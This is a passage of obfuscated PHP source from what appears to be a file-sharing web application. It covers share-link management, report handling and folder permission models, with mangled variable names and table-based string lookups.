$Ş‰ë«íº[101]) { $Á÷•Ê = $Ş‰ë«íº[2278]; } if ($Õ¥±áÕƒ[$Ş‰ë«íº[583]] == $Ş‰ë«íº[101] && $²îµÆºÀ[$Ş‰ë«íº[583]] == $Ş‰ë«íº[239]) { $Á÷•Ê = $Ş‰ë«íº[2281]; } if ($Õ¥±áÕƒ[$Ş‰ë«íº[691]] == $Ş‰ë«íº[239] && $²îµÆºÀ[$Ş‰ë«íº[691]] == $Ş‰ë«íº[101]) { $Á÷•Ê = $Ş‰ë«íº[2279]; } if ($Õ¥±áÕƒ[$Ş‰ë«íº[691]] == $Ş‰ë«íº[101] && $²îµÆºÀ[$Ş‰ë«íº[691]] == $Ş‰ë«íº[239]) { $Á÷•Ê = $Ş‰ë«íº[2282]; } Model($Ş‰ë«íº[661])->eventShare($±ÚÓÒÚ, $Á÷•Ê); return; } private function _addShareData($ùò®Ü„ª, $˜°›ö°½ = array(), $°ÓÄ¤ıê = false) { $÷ãúõÉş =& $_SERVER[ŒÅŸ‹ä†]; $ğˆİ…şÀ = $°ÓÄ¤ıê == $÷ãúõÉş[200] ? 0 : USER_ID; $·ÎÔ®úÑ = array($÷ãúõÉş[511] => $ùò®Ü„ª, $÷ãúõÉş[1911] => $ğˆİ…şÀ); if ($ùò®Ü„ª == 0) { $·ÎÔ®úÑ = array($÷ãúõÉş[2283] => $˜°›ö°½[$÷ãúõÉş[588]], $÷ãúõÉş[1911] => $ğˆİ…şÀ); } if ($Ü„Å€øµ = $this->where($·ÎÔ®úÑ)->find()) { return $Ü„Å€øµ[$÷ãúõÉş[693]]; } if ($ùò®Ü„ª == 0) { $°ƒìñ¡á = array($÷ãúõÉş[42] => get_path_this($˜°›ö°½[$÷ãúõÉş[97]])); } else { $°ƒìñ¡á = Model($÷ãúõÉş[929])->sourceInfo($ùò®Ü„ª); if (!$°ƒìñ¡á) { return !1; } } if (!$˜°›ö°½[$÷ãúõÉş[1808]]) { $˜°›ö°½[$÷ãúõÉş[1808]] = $°ƒìñ¡á[$÷ãúõÉş[42]]; } $ÌšÄûªş = array($÷ãúõÉş[1911] => $ğˆİ…şÀ, $÷ãúõÉş[511] => $ùò®Ü„ª, $÷ãúõÉş[1808] => $÷ãúõÉş[12], $÷ãúõÉş[583] => 0, $÷ãúõÉş[691] => 0, $÷ãúõÉş[588] => $÷ãúõÉş[12], $÷ãúõÉş[392] => $÷ãúõÉş[12], $÷ãúõÉş[997] => $÷ãúõÉş[12], $÷ãúõÉş[2284] => 0, $÷ãúõÉş[2285] => 0, $÷ãúõÉş[858] => 0, $÷ãúõÉş[585] => $÷ãúõÉş[12], $÷ãúõÉş[1499] => $÷ãúõÉş[12]); $¶„Îß³Ş = explode($÷ãúõÉş[60], $÷ãúõÉş[2286]); foreach ($¶„Îß³Ş as $œÑœğëØ) { if (!isset($˜°›ö°½[$œÑœğëØ])) { continue; } $ÌšÄûªş[$œÑœğëØ] = $˜°›ö°½[$œÑœğëØ]; } $áò‡Ä£ = $this->add($ÌšÄûªş); $Æ˜Œ¹â¬ = array($÷ãúõÉş[1499] => short_id($áò‡Ä£)); if ($this->where($Æ˜Œ¹â¬)->find()) { $Æ˜Œ¹â¬[$÷ãúõÉş[1499]] .= $÷ãúõÉş[482] . rand_string(2, 3); } $this->where(array($÷ãúõÉş[2287] => $áò‡Ä£))->save($Æ˜Œ¹â¬); return $áò‡Ä£; } private function _shareAuthSet($§şµûöÕ, $ş›ïÎœ) { $ÖÒİ¤¿“ =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($ş›ïÎœ)) { return !1; } $™÷ˆÕƒ© = Model($ÖÒİ¤¿“[2235]); $™÷ˆÕƒ©->where(array($ÖÒİ¤¿“[693] => $§şµûöÕ))->delete(); $ÑŒÍğ® = array(); foreach ($ş›ïÎœ as $³×ã˜¤ñ) { $‰Şô·ò = SourceModel::TYPE_USER; if ($³×ã˜¤ñ[$ÖÒİ¤¿“[199]] == SourceModel::TYPE_GROUP) { $‰Şô·ò = SourceModel::TYPE_GROUP; } $Ü¡¸èÖÁ = array($ÖÒİ¤¿“[693] => $§şµûöÕ, $ÖÒİ¤¿“[199] => $‰Şô·ò, $ÖÒİ¤¿“[594] => intval($³×ã˜¤ñ[$ÖÒİ¤¿“[594]]), $ÖÒİ¤¿“[1584] => 0, $ÖÒİ¤¿“[2288] => -1); if ($³×ã˜¤ñ[$ÖÒİ¤¿“[1584]]) { $Ü¡¸èÖÁ[$ÖÒİ¤¿“[1584]] = $³×ã˜¤ñ[$ÖÒİ¤¿“[1584]]; } else { if ($³×ã˜¤ñ[$ÖÒİ¤¿“[2288]]) { $Ü¡¸èÖÁ[$ÖÒİ¤¿“[2288]] = $³×ã˜¤ñ[$ÖÒİ¤¿“[2288]]; } } $ÑŒÍğ®[] = $Ü¡¸èÖÁ; } return $™÷ˆÕƒ©->addAll($ÑŒÍğ®, array(), !0); } public function numViewAdd($ËœÉ¯£ö) { $¦¶ò¯ö´ =& $_SERVER[ŒÅŸ‹ä†]; $Õ¾Áëñœ = array($¦¶ò¯ö´[2287] => $ËœÉ¯£ö); $this->where($Õ¾Áëñœ)->setAdd($¦¶ò¯ö´[2284]); } public function numDownloadAdd($àåª„ã) { $©¹­’„ =& $_SERVER[ŒÅŸ‹ä†]; $¿†õÚ¬î = array($©¹­’„[2287] => $àåª„ã); $this->where($¿†õÚ¬î)->setAdd($©¹­’„[2285]); } protected function shareEdit($Œ««ù„, $Ú¾¢”È÷) { $÷ŸŸ°Šè =& $_SERVER[ŒÅŸ‹ä†]; $ŸÕ¤‹¬ = $this->getInfo($Œ««ù„); if (!$ŸÕ¤‹¬) { return !1; } if ($Ú¾¢”È÷[$÷ŸŸ°Šè[1499]] && $Ú¾¢”È÷[$÷ŸŸ°Šè[583]] == $÷ŸŸ°Šè[101]) { if ($Ú¾¢”È÷[$÷ŸŸ°Šè[1499]] == $ŸÕ¤‹¬[$÷ŸŸ°Šè[1499]]) { unset($Ú¾¢”È÷[$÷ŸŸ°Šè[1499]]); } if ($Ú¾¢”È÷[$÷ŸŸ°Šè[1499]]) { $ºåÖœ€ = $this->where(array($÷ŸŸ°Šè[2289] => $Ú¾¢”È÷[$÷ŸŸ°Šè[1499]]))->find(); if ($ºåÖœ€) { return !1; } if (!is_array($Ú¾¢”È÷[$÷ŸŸ°Šè[585]])) { $Ú¾¢”È÷[$÷ŸŸ°Šè[585]] = is_array($ŸÕ¤‹¬[$÷ŸŸ°Šè[585]]) ? $ŸÕ¤‹¬[$÷ŸŸ°Šè[585]] : array(); } if (!$Ú¾¢”È÷[$÷ŸŸ°Šè[585]][$÷ŸŸ°Šè[2290]]) { $Ú¾¢”È÷[$÷ŸŸ°Šè[585]][$÷ŸŸ°Šè[2290]] = $ŸÕ¤‹¬[$÷ŸŸ°Šè[1499]]; $Ú¾¢”È÷[$÷ŸŸ°Šè[585]][$÷ŸŸ°Šè[2291]] = $÷ŸŸ°Šè[101]; } } } $this->_checkLinkShare($Ú¾¢”È÷, $ŸÕ¤‹¬); $†şí°Ÿ† = array(); $·ğüËé’ = explode($÷ŸŸ°Šè[60], $÷ŸŸ°Šè[2292]); foreach ($·ğüËé’ as $ø”ğï») { if (!array_key_exists($ø”ğï», $Ú¾¢”È÷)) { continue; } $†şí°Ÿ†[$ø”ğï»] = $Ú¾¢”È÷[$ø”ğï»]; } $this->shareEventAdd($ŸÕ¤‹¬[$÷ŸŸ°Šè[202]], $Ú¾¢”È÷, $÷ŸŸ°Šè[1506]); $this->where(array($÷ŸŸ°Šè[2287] => $Œ««ù„))->save($†şí°Ÿ†); if (isset($Ú¾¢”È÷[$÷ŸŸ°Šè[2276]])) { $this->_shareAuthSet($Œ««ù„, $Ú¾¢”È÷[$÷ŸŸ°Šè[2276]]); } return !0; } private function _checkLinkShare($ø¡ú­Ø, $Á¸¶ïƒ) { $÷åòÏÈ“ =& $_SERVER[ŒÅŸ‹ä†]; if ($ø¡ú­Ø[$÷åòÏÈ“[583]] != $÷åòÏÈ“[101]) { return; } $Ùîøåéº = $Á¸¶ïƒ[$÷åòÏÈ“[100]][$÷åòÏÈ“[202]]; if ($Á¸¶ïƒ[$÷åòÏÈ“[100]][$÷åòÏÈ“[43]] != $÷åòÏÈ“[241]) { $ß—ÙğÓø = $this->_folderReport($Ùîøåéº); if (!$ß—ÙğÓø) { return; } show_json(LNG($÷åòÏÈ“[2293]) . $÷åòÏÈ“[2294] . $ß—ÙğÓø, !1); } $¹½åÍ–¿ = Model($÷åòÏÈ“[929])->fileInfoGet($Á¸¶ïƒ[$÷åòÏÈ“[100]][$÷åòÏÈ“[202]]); if (!$¹½åÍ–¿) { return; } $—‘Î¬‡ = $this->shareFileMeta($¹½åÍ–¿[$÷åòÏÈ“[562]]); if (isset($—‘Î¬‡[$÷åòÏÈ“[460]]) && $—‘Î¬‡[$÷åòÏÈ“[460]] == $÷åòÏÈ“[101]) { show_json(LNG($÷åòÏÈ“[2295]), !1); } } private function _folderReport($„ŞÆ•®¾) { $Ü€˜±µ½ =& $_SERVER[ŒÅŸ‹ä†]; $×œË™°Ä = array($Ü€˜±µ½[562] => array($Ü€˜±µ½[1123], 0), $Ü€˜±µ½[846] => 3); $üç Ùğ = Model($Ü€˜±µ½[2296])->where($×œË™°Ä)->field($Ü€˜±µ½[562])->select(); if (!$üç Ùğ) { return !1; } $üç Ùğ = array_to_keyvalue($üç Ùğ, $Ü€˜±µ½[12], $Ü€˜±µ½[562]); $ÙâÃ˜ò¸ = $Ü€˜±µ½[60] . $„ŞÆ•®¾ . $Ü€˜±µ½[60]; $×œË™°Ä = array($Ü€˜±µ½[562] => array($Ü€˜±µ½[7], $üç Ùğ), $Ü€˜±µ½[609] => array($Ü€˜±µ½[479], "\45{$ÙâÃ˜ò¸}\45"), $Ü€˜±µ½[525] => 0); $£åÉ•ææ = Model($Ü€˜±µ½[929])->where($×œË™°Ä)->field($Ü€˜±µ½[2297])->find(); if (!$£åÉ•ææ) { return !1; } $ùú‹ª»¦ = substr($£åÉ•ææ[$Ü€˜±µ½[609]], strpos($£åÉ•ææ[$Ü€˜±µ½[609]], $ÙâÃ˜ò¸)); $×œË™°Ä = array($Ü€˜±µ½[202] => array($Ü€˜±µ½[7], trim($ùú‹ª»¦, $Ü€˜±µ½[60]))); $ÙãìÂ‚ = Model($Ü€˜±µ½[929])->where($×œË™°Ä)->field($Ü€˜±µ½[42])->select(); $¯·Ëë“œ = array_to_keyvalue($ÙãìÂ‚, $Ü€˜±µ½[12], $Ü€˜±µ½[42]); $¯·Ëë“œ[] = $£åÉ•ææ[$Ü€˜±µ½[42]]; return implode($Ü€˜±µ½[8], $¯·Ëë“œ); } protected function remove($÷»µÅ¢) { $ŸñàÊûÍ =& $_SERVER[ŒÅŸ‹ä†]; $â¾¶‘¾à = is_array($÷»µÅ¢) ? $÷»µÅ¢ : array($÷»µÅ¢); for ($‚„ôñş = 0; $‚„ôñş < count($â¾¶‘¾à); $‚„ôñş++) { $Å©óÔè = $this->getInfo($â¾¶‘¾à[$‚„ôñş]); if ($Å©óÔè[$ŸñàÊûÍ[691]] == $ŸñàÊûÍ[101]) { Model($ŸñàÊûÍ[661])->eventShare($Å©óÔè[$ŸñàÊûÍ[202]], $ŸñàÊûÍ[2282]); } if ($Å©óÔè[$ŸñàÊûÍ[583]] == $ŸñàÊûÍ[101]) { Model($ŸñàÊûÍ[661])->eventShare($Å©óÔè[$ŸñàÊûÍ[202]], $ŸñàÊûÍ[2281]); } } $‰Á¦Â÷ = array($ŸñàÊûÍ[693] => array($ŸñàÊûÍ[7], $â¾¶‘¾à)); $…ö¹³ôõ = $this->where($‰Á¦Â÷)->delete(); if ($…ö¹³ôõ) { Model($ŸñàÊûÍ[694])->where($‰Á¦Â÷)->delete(); } return $…ö¹³ôõ; } protected function removeBySource($ÀÂÎÌÇ) { $Š•ŒÃ‰Í =& $_SERVER[ŒÅŸ‹ä†]; $›¦•—–¢ = array($Š•ŒÃ‰Í[511] => array($Š•ŒÃ‰Í[512], $ÀÂÎÌÇ)); $ƒÌçÎö = $this->field($Š•ŒÃ‰Í[693])->where($›¦•—–¢)->select(); $‹§ÒÒÖè = array_to_keyvalue($ƒÌçÎö, $Š•ŒÃ‰Í[12], $Š•ŒÃ‰Í[693]); if (!$‹§ÒÒÖè) { return; } foreach ($ƒÌçÎö as $×ä»”Õ¦) { $this->shareInfoMofify($×ä»”Õ¦, $Š•ŒÃ‰Í[2298]); } $›¦•—–¢ = array($Š•ŒÃ‰Í[2287] => array($Š•ŒÃ‰Í[512], $‹§ÒÒÖè)); $this->where($›¦•—–¢)->delete(); Model($Š•ŒÃ‰Í[694])->where($›¦•—–¢)->delete(); } public function listAll($‘»îˆÅÈ) { $ïÄß¼„¬ =& $_SERVER[ŒÅŸ‹ä†]; $ØÜ«÷õ­ = array(); if ($‘»îˆÅÈ[$ïÄß¼„¬[1537]]) { $ØÜ«÷õ­[$ïÄß¼„¬[1537]] = $‘»îˆÅÈ[$ïÄß¼„¬[1537]]; } if ($‘»îˆÅÈ[$ïÄß¼„¬[857]]) { $òäˆ—Ñ© = $‘»îˆÅÈ[$ïÄß¼„¬[858]] ? $‘»îˆÅÈ[$ïÄß¼„¬[858]] : strtotime(date($ïÄß¼„¬[2299])); $ØÜ«÷õ­[$ïÄß¼„¬[242]] = array($ïÄß¼„¬[418], array($‘»îˆÅÈ[$ïÄß¼„¬[857]], $òäˆ—Ñ©)); } if ($‘»îˆÅÈ[$ïÄß¼„¬[43]]) { $ØÜ«÷õ­[$‘»îˆÅÈ[$ïÄß¼„¬[43]]] = 1; } else { $ØÜ«÷õ­[] = array($ïÄß¼„¬[583] => array($ïÄß¼„¬[1123], 0), $ïÄß¼„¬[691] => array($ïÄß¼„¬[1123], 0), $ïÄß¼„¬[2270] => $ïÄß¼„¬[2226]); } if ($‘»îˆÅÈ[$ïÄß¼„¬[2222]]) { $ØÜ«÷õ­[] = array($ïÄß¼„¬[1499] => $‘»îˆÅÈ[$ïÄß¼„¬[2222]], $ïÄß¼„¬[1808] => array($ïÄß¼„¬[479], "\45{$‘»îˆÅÈ[$ïÄß¼„¬[2222]]}\x25"), $ïÄß¼„¬[2270] => $ïÄß¼„¬[2226]); } $Œé×î£— = $this->_makeOrder()->where($ØÜ«÷õ­)->selectPage(20); if (empty($Œé×î£—[$ïÄß¼„¬[455]])) { return array(); } $this->_listDataApply($Œé×î£—[$ïÄß¼„¬[455]]); return $Œé×î£—; } public function listDataApply($âò’ÏùÁ) { $this->_listDataApply($âò’ÏùÁ); return $âò’ÏùÁ; } private function _listDataApply(&$ş°Ì…ç) { $™Ñ˜øè÷ =& $_SERVER[ŒÅŸ‹ä†]; $»®ë–× = array_to_keyvalue($ş°Ì…ç, $™Ñ˜øè÷[12], $™Ñ˜øè÷[1537]); $÷ï«Ğ = Model($™Ñ˜øè÷[622])->userListInfo(array_unique($»®ë–×)); $ì¢şõ®  = array_to_keyvalue($ş°Ì…ç, $™Ñ˜øè÷[12], $™Ñ˜øè÷[202]); $¡÷ÆøÎê = Model($™Ñ˜øè÷[929])->sourceListInfo($ì¢şõ® , !0); foreach ($ş°Ì…ç as $İÆ¢ÇË => &$İñÎª“) { $‚“ÒîºÒ = $İñÎª“[$™Ñ˜øè÷[1537]]; $İñÎª“[$™Ñ˜øè÷[2300]] = $÷ï«Ğ[$‚“ÒîºÒ] ? $÷ï«Ğ[$‚“ÒîºÒ] : !1; if (!$İñÎª“[$™Ñ˜øè÷[2300]] || $İñÎª“[$™Ñ˜øè÷[2300]][$™Ñ˜øè÷[846]] != $™Ñ˜øè÷[101]) { unset($ş°Ì…ç[$İÆ¢ÇË]); continue; } $à˜¹¶ØÀ = $İñÎª“[$™Ñ˜øè÷[202]]; $İñÎª“[$™Ñ˜øè÷[100]] = $¡÷ÆøÎê[$à˜¹¶ØÀ] ? $¡÷ÆøÎê[$à˜¹¶ØÀ] : !1; if ($İñÎª“[$™Ñ˜øè÷[100]][$™Ñ˜øè÷[525]] == $™Ñ˜øè÷[101]) { unset($ş°Ì…ç[$İÆ¢ÇË]); } if ($İñÎª“[$™Ñ˜øè÷[100]] != $™Ñ˜øè÷[239] && !$İñÎª“[$™Ñ˜øè÷[100]]) { unset($ş°Ì…ç[$İÆ¢ÇË]); } } unset($İñÎª“); $ş°Ì…ç = array_values($ş°Ì…ç); } private function _makeOrder($Õ”Áõúé = '') { $šĞàøã =& $_SERVER[ŒÅŸ‹ä†]; $¢Ç‹¾… = array($šĞàøã[242], $šĞàøã[858], $šĞàøã[2284], $šĞàøã[2285]); $—ß»‹Íß = array($šĞàøã[542] => $šĞàøã[543], $šĞàøã[544] => $šĞàøã[545]); $°Ş’“Âé = Input::get($šĞàøã[549], $šĞàøã[7], $šĞàøã[517], $¢Ç‹¾…); $ºêö†Ä¬ = Input::get($šĞàøã[550], $šĞàøã[7], $šĞàøã[2301], array($šĞàøã[2219], $šĞàøã[544])); $ºêö†Ä¬ = $—ß»‹Íß[$ºêö†Ä¬]; $Õ”Áõúé = $Õ”Áõúé . "{$°Ş’“Âé}\40{$ºêö†Ä¬}"; return $this->order($Õ”Áõúé); } public function reportAdd($¯µÅíŞè) { $Ùû‡´í· =& $_SERVER[ŒÅŸ‹ä†]; $ß ĞÉıÍ = array($Ùû‡´í·[693] => $¯µÅíŞè[$Ùû‡´í·[693]], $Ùû‡´í·[1537] => USER_ID); if (Model($Ùû‡´í·[2296])->where($ß ĞÉıÍ)->find()) { return !1; } $ÕâË€ë = array($Ùû‡´í·[693] => $¯µÅíŞè[$Ùû‡´í·[693]], $Ùû‡´í·[1808] => $¯µÅíŞè[$Ùû‡´í·[1808]], $Ùû‡´í·[202] => $¯µÅíŞè[$Ùû‡´í·[202]], $Ùû‡´í·[562] => $¯µÅíŞè[$Ùû‡´í·[562]], $Ùû‡´í·[1537] => USER_ID, $Ùû‡´í·[43] => $¯µÅíŞè[$Ùû‡´í·[43]], $Ùû‡´í·[545] => $¯µÅíŞè[$Ùû‡´í·[545]]); return Model($Ùû‡´í·[2296])->add($ÕâË€ë); } public function reportList($ŒÚ´²ƒÒ) { $À›œ· =& $_SERVER[ŒÅŸ‹ä†]; $Š™±ìÉ° = array(); if ($ŒÚ´²ƒÒ[$À›œ·[857]]) { $º´ÌÀÄ = $ŒÚ´²ƒÒ[$À›œ·[858]] ? $ŒÚ´²ƒÒ[$À›œ·[858]] : strtotime(date($À›œ·[2299])); $Š™±ìÉ°[$À›œ·[242]] = array($À›œ·[418], array($ŒÚ´²ƒÒ[$À›œ·[857]], $º´ÌÀÄ)); } if (isset($ŒÚ´²ƒÒ[$À›œ·[43]]) && in_array($ŒÚ´²ƒÒ[$À›œ·[43]], array($À›œ·[101], $À›œ·[529], $À›œ·[2302], $À›œ·[2303], $À›œ·[2304]))) { $Š™±ìÉ°[$À›œ·[43]] = $ŒÚ´²ƒÒ[$À›œ·[43]]; } if (isset($ŒÚ´²ƒÒ[$À›œ·[846]]) && in_array($ŒÚ´²ƒÒ[$À›œ·[846]], array($À›œ·[239], $À›œ·[101], $À›œ·[529], $À›œ·[2302]))) { $Š™±ìÉ°[$À›œ·[846]] = $ŒÚ´²ƒÒ[$À›œ·[846]]; } $æù…„ = Input::get($À›œ·[550], $À›œ·[7], $À›œ·[2301], array($À›œ·[2219], $À›œ·[544])); $ğ¥ñá¹€ = array($À›œ·[542] => $À›œ·[543], $À›œ·[544] => $À›œ·[545]); $‹™áêİ¥ = $À›œ·[2305] . $ğ¥ñá¹€[$æù…„]; $ÕïÜÍ½à = Model($À›œ·[2296])->where($Š™±ìÉ°)->order($‹™áêİ¥)->selectPage(20); if (empty($ÕïÜÍ½à[$À›œ·[455]])) { return array(); } $ù¼èšø = array_to_keyvalue_group($ÕïÜÍ½à[$À›œ·[455]], $À›œ·[846], $À›œ·[693]); if (!empty($ù¼èšø[0])) { $ŒÚ´²ƒÒ = $ù¼èšø[0]; $Š™±ìÉ° = array($À›œ·[693] => array($À›œ·[7], $ŒÚ´²ƒÒ)); $¡™›³ù = $this->where($Š™±ìÉ°)->field($À›œ·[693])->select(); $¡™›³ù = array_to_keyvalue($¡™›³ù, $À›œ·[12], $À›œ·[693]); $ğ‹±²ôª = array_diff($ŒÚ´²ƒÒ, $¡™›³ù); if (!empty($ğ‹±²ôª)) { foreach ($ÕïÜÍ½à[$À›œ·[455]] as $§Ş•¿¸º => $«§ùËÔÕ) { if (in_array($«§ùËÔÕ[$À›œ·[693]], $ğ‹±²ôª)) { unset($ÕïÜÍ½à[$À›œ·[455]][$§Ş•¿¸º]); } } } } $this->_listDataApply($ÕïÜÍ½à[$À›œ·[455]]); return $ÕïÜÍ½à; } public function reportStatus($ş³ù¶ ) { $ë™³¦«‘ =& $_SERVER[ŒÅŸ‹ä†]; $Ç‡†ã‘Ş = array($ë™³¦«‘[492] => $ş³ù¶ [$ë™³¦«‘[492]]); $¶Øı÷”À = Model($ë™³¦«‘[2296])->where($Ç‡†ã‘Ş)->field($ë™³¦«‘[2306])->find(); if (!$¶Øı÷”À) { return !1; } $äĞ¨î— = array($ë™³¦«‘[846] => $ş³ù¶ [$ë™³¦«‘[846]]); if ($ş³ù¶ [$ë™³¦«‘[846]] == $ë™³¦«‘[2302] && $¶Øı÷”À[$ë™³¦«‘[846]] == $ë™³¦«‘[2302]) { $äĞ¨î—[$ë™³¦«‘[846]] = 0; } $·ÈŠ¸†Î = Model($ë™³¦«‘[2296])->where($Ç‡†ã‘Ş)->save($äĞ¨î—); if ($ş³ù¶ [$ë™³¦«‘[846]] == $ë™³¦«‘[529]) { if ($¶Øı÷”À[$ë™³¦«‘[562]] != $ë™³¦«‘[239] && $this->shareFileMeta($¶Øı÷”À[$ë™³¦«‘[562]])) { $this->shareFileMeta($¶Øı÷”À[$ë™³¦«‘[562]], 0); } $this->remove($¶Øı÷”À[$ë™³¦«‘[693]]); return !0; } if ($·ÈŠ¸†Î && $ş³ù¶ [$ë™³¦«‘[846]] == $ë™³¦«‘[2302]) { $¿íÑü¤À = $äĞ¨î—[$ë™³¦«‘[846]] == $ë™³¦«‘[2302] ? 1 : 0; $this->shareFileMeta($¶Øı÷”À[$ë™³¦«‘[562]], $¿íÑü¤À); $this->removeByFile($¶Øı÷”À[$ë™³¦«‘[562]]); } return $·ÈŠ¸†Î; } private function removeByFile($¸‡­«½‰) { $Ëäİ³½× =& $_SERVER[ŒÅŸ‹ä†]; $ó®®™Çº = Model($Ëäİ³½×[929])->where(array($Ëäİ³½×[562] => $¸‡­«½‰))->field($Ëäİ³½×[202])->select(); $Ò‡Æº¿È = array_to_keyvalue($ó®®™Çº, $Ëäİ³½×[12], $Ëäİ³½×[202]); $ÎÏ½ÑæØ = array($Ëäİ³½×[202] => array($Ëäİ³½×[7], $Ò‡Æº¿È), $Ëäİ³½×[583] => 1); $ó®®™Çº = $this->where($ÎÏ½ÑæØ)->field($Ëäİ³½×[693])->select(); if (empty($ó®®™Çº)) { return; } $¡ÏŞØ§Œ = array_to_keyvalue($ó®®™Çº, $Ëäİ³½×[12], $Ëäİ³½×[693]); $this->remove($¡ÏŞØ§Œ); } private function shareFileMeta($¸Åë§âŞ, $ò›’×Ì = null) { $±ÙÓÙäğ =& $_SERVER[ŒÅŸ‹ä†]; $éÑ‡ã = array($±ÙÓÙäğ[562] => $¸Åë§âŞ, $±ÙÓÙäğ[105] => $±ÙÓÙäğ[2307]); if (is_null($ò›’×Ì)) { return Model($±ÙÓÙäğ[2308])->where($éÑ‡ã)->find(); } $éÑ‡ã[$±ÙÓÙäğ[460]] = $ò›’×Ì; Model($±ÙÓÙäğ[2308])->add($éÑ‡ã, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\x65\137\x61\x75\x74\150"; public function getAuth($Œ•†öÓ) { $æëÏ²… =& $_SERVER[ŒÅŸ‹ä†]; $¹Ó«Îş = $this->sourceAuthSelect($Œ•†öÓ); $¸ëûå­É = array(); $şòªõ± = array(); $²è¢ß’æ = 2 << 25; foreach ($¹Ó«Îş as $ÜÏİèÑŠ) { $ºİÑ“£³ = Model($æëÏ²…[596])->listData($ÜÏİèÑŠ[$æëÏ²…[1584]]); if (!$ºİÑ“£³) { continue; } $¸ëûå­É[] = $ÜÏİèÑŠ; $è°—¡ë = 0; if ($ÜÏİèÑŠ[$æëÏ²…[199]] == SourceModel::TYPE_GROUP) { $è°—¡ë = $²è¢ß’æ * 2; } if ($ÜÏİèÑŠ[$æëÏ²…[199]] == SourceModel::TYPE_USER) { $è°—¡ë = $²è¢ß’æ; } if ($ÜÏİèÑŠ[$æëÏ²…[199]] == SourceModel::TYPE_USER && $ÜÏİèÑŠ[$æëÏ²…[594]] == $æëÏ²…[239]) { $è°—¡ë = 0; } $şòªõ±[] = $ºİÑ“£³[$æëÏ²…[507]] + $è°—¡ë; } array_multisort($şòªõ±, SORT_DESC, $¸ëûå­É); return $¸ëûå­É; } public function sourceAuthSelect($ÌÚ„Åï¦) { $óÕ®Š¢³ =& $_SERVER[ŒÅŸ‹ä†]; static $¬™Ğ‹ïñ = array(); $š®“ß¿ = is_array($ÌÚ„Åï¦) ? !1 : !0; if ($š®“ß¿) { $ÌÚ„Åï¦ = array($ÌÚ„Åï¦); } $ŞÄ˜Ó = array(); foreach ($ÌÚ„Åï¦ as $Û¯Î°÷Ü) { if (isset($¬™Ğ‹ïñ[$Û¯Î°÷Ü])) { $ŞÄ˜Ó[$Û¯Î°÷Ü] = $¬™Ğ‹ïñ[$Û¯Î°÷Ü]; } } if (count($ŞÄ˜Ó) == count($ÌÚ„Åï¦)) { return $š®“ß¿ ? $ŞÄ˜Ó[$ÌÚ„Åï¦[0]] : $ŞÄ˜Ó; } $Æ§¶€Ù­ = $óÕ®Š¢³[2309]; $ıãÎœÔ = array($óÕ®Š¢³[202] => array($óÕ®Š¢³[7], $ÌÚ„Åï¦)); $‰¡«„ô‡ = $this->field($Æ§¶€Ù­)->order($óÕ®Š¢³[492])->where($ıãÎœÔ)->select(); $ıîÕü¸· = array_to_keyvalue_group($‰¡«„ô‡, $óÕ®Š¢³[202]); foreach ($ÌÚ„Åï¦ as $Û¯Î°÷Ü) { $¬™Ğ‹ïñ[$Û¯Î°÷Ü] = $ıîÕü¸·[$Û¯Î°÷Ü] ? $ıîÕü¸·[$Û¯Î°÷Ü] : array(); } if ($š®“ß¿) { return $‰¡«„ô‡; } return $ıîÕü¸·; } public function setAuth($ÄüñÃĞ‘, $‚ä™çàÔ) { $ÂóÌõª´ =& $_SERVER[ŒÅŸ‹ä†]; $ÀèçïÀ¸ = Model($ÂóÌõª´[1477])->sourceInfo($ÄüñÃĞ‘); if (!$ÀèçïÀ¸) { return !1; } if ($ÀèçïÀ¸[$ÂóÌõª´[199]] != SourceModel::TYPE_GROUP) { return !1; } $ìı¢Ê˜ = 1; $ € ÍÅ = $ÀèçïÀ¸[$ÂóÌõª´[594]]; if ($ € ÍÅ != $ìı¢Ê˜) { $‰ŠÌÖÂ = array($ÂóÌõª´[1439] => $ € ÍÅ); $Üâ•¦À± = Model($ÂóÌõª´[2218])->field($ÂóÌõª´[1537])->where($‰ŠÌÖÂ)->select(); $Üâ•¦À± = array_to_keyvalue($Üâ•¦À±, $ÂóÌõª´[12], $ÂóÌõª´[1537]); } $Õ¿Íö¶û = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ùøÍÍ×ˆ = array(); foreach ($‚ä™çàÔ as $È”»·ôİ) { if (!in_array($È”»·ôİ[$ÂóÌõª´[199]], $Õ¿Íö¶û)) { show_json(LNG($ÂóÌõª´[2310]), !1); } if ($ € ÍÅ != $ìı¢Ê˜) { if ($È”»·ôİ[$ÂóÌõª´[199]] == SourceModel::TYPE_GROUP) { } if ($È”»·ôİ[$ÂóÌõª´[594]] != 0 && !in_array($È”»·ôİ[$ÂóÌõª´[594]], $Üâ•¦À±)) { } } if ($È”»·ôİ[$ÂóÌõª´[594]] == 0) { $È”»·ôİ[$ÂóÌõª´[199]] = SourceModel::TYPE_USER; } $ùøÍÍ×ˆ[] = array($ÂóÌõª´[202] => $ÄüñÃĞ‘, $ÂóÌõª´[199] => intval($È”»·ôİ[$ÂóÌõª´[199]]), $ÂóÌõª´[594] => intval($È”»·ôİ[$ÂóÌõª´[594]]), $ÂóÌõª´[1584] => intval($È”»·ôİ[$ÂóÌõª´[1584]]) ? intval($È”»·ôİ[$ÂóÌõª´[1584]]) : 0, $ÂóÌõª´[2288] => intval($È”»·ôİ[$ÂóÌõª´[2288]]) ? intval($È”»·ôİ[$ÂóÌõª´[2288]]) : -1); } $this->where(array($ÂóÌõª´[511] => $ÄüñÃĞ‘))->delete(); $this->addAll($ùøÍÍ×ˆ); return !0; } public function authClear($×“ØÌ) { $¤²è¦Ü¿ =& $_SERVER[ŒÅŸ‹ä†]; $‰ ß©¯Ô = Model($¤²è¦Ü¿[1477])->sourceInfo($×“ØÌ); $ÇÔ·¨‚ = array($×“ØÌ); if ($‰ ß©¯Ô[$¤²è¦Ü¿[505]] == $¤²è¦Ü¿[101]) { $ï‡¢¤€ = array($¤²è¦Ü¿[680] => array($¤²è¦Ü¿[640], $‰ ß©¯Ô[$¤²è¦Ü¿[609]] . $×“ØÌ . $¤²è¦Ü¿[641])); $ÇÔ·¨‚ = Model($¤²è¦Ü¿[1477])->field($¤²è¦Ü¿[511])->where($ï‡¢¤€)->getField($¤²è¦Ü¿[202], !0); $ÇÔ·¨‚[] = $×“ØÌ; } $this->where(array($¤²è¦Ü¿[511] => array($¤²è¦Ü¿[512], $ÇÔ·¨‚)))->delete(); return !0; } public function getAllParent($Ú¯Èá¬) { $…§‡ûÔÚ =& 